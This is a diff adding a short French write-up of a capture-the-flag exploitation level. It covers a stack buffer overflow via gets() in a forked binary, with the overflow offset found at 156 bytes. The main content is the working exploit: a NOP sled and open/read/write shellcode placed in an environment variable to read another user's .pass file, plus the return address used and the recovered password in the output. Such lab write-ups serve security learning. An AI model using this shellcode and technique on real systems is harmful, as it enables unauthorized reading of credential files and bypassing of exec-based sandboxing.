@@ -1,0 +1,27 @@
+
+Le programme fork:
+
+Dans la partie child, il attend qu on lui envoie un shellcode, il utilise la fonction gets().
+On va donc pouvoir faire un buffer overflow et y executer du shellcode qui se trouve dans l env
+
+On essaye jusqu'à avoir un comportement different:
+	$ (sleep 0.5; python -c 'print "A"*155') | ./level04
+	Give me some shellcode, k
+	child is exiting...
+
+	$ (sleep 0.5; python -c 'print "A"*156') | ./level04
+	Give me some shellcode, k
+	Give me some shellcode, k
+overflow apres 156 chars
+
+Dans la partie parent, il verifie les syscall du child, si ce dernier utilise exec, il nous print un msg
+d erreur et kill le child puis exit.
+
+Il faut donc faire un shellcode avec autre chose que exec, on va donc utiliser open read et write:
+   $ python -c 'print "\x90"*4000 + "\xeb\x26\xb0\x05\x5b\x31\xc9\x31\xd2\xcd\x80\x83\xec\x64\x89\xc3\xb0\x03\x89\xe1\xb2\x64\xcd\x80\xb0\x04\xb3\x01\x89\xe1\xb2\x64\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xd5\xff\xff\xff/home/users/level05/.pass"' > /tmp/exploit4k_OpenReadWrite
+   $ export _SHELL="`cat /tmp/exploit4k_OpenReadWrite`"
+   $ (sleep 0.5; python -c 'print "A"*156 + "\x58\xd0\xff\xff"') | ./level04
+   Give me some shellcode, k
+   3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAk▒▒▒child is exiting...
+
